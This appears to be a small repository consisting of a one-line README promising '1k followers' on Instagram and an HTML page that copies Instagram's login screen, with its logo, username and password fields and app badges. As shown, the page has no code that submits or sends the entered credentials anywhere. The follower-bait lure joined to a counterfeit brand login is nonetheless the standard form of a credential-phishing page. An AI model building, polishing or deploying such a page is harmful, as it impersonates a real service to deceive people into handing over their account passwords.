# 1k-on-instagram-account-login
this is the web where u can get 1k follower in instagram account
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        /* All your "decoration" code goes here now */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }

        .login-container {
            width: 350px;
        }

        .box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            margin-bottom: 10px;
            text-align: center;
        }

        .logo img {
            width: 175px;
            margin-bottom: 30px;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            margin-bottom: 6px;
            font-size: 12px;
        }

        .login-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: 600;
            margin: 8px 0;
            cursor: pointer;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }

        .line { flex: 1; height: 1px; background-color: #dbdbdb; }
        .or { padding: 0 15px; color: #8e8e8e; font-size: 13px; font-weight: 600; }

        .signup-box { font-size: 14px; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
        
        .app-links img { height: 40px; margin: 5px; }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="box">
            <div class="logo">
                <!-- Using a stable public logo link -->
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
            </div>
            
            <form>
                <input type="text" placeholder="Phone number, username, or email">
                <input type="password" placeholder="Password">
                <button type="button" class="login-btn">Log In</button>
                
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>
                
                <p style="color: #385185; font-size: 14px; font-weight: 600; cursor: pointer;">Log in with Facebook</p>
            </form>
        </div>

        <div class="box signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        
        <div style="text-align: center; margin-top: 10px;">
            <p style="font-size: 14px;">Get the app.</p>
            <div class="app-links">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png">
            </div>
        </div>
    </div>

</body>
</html>
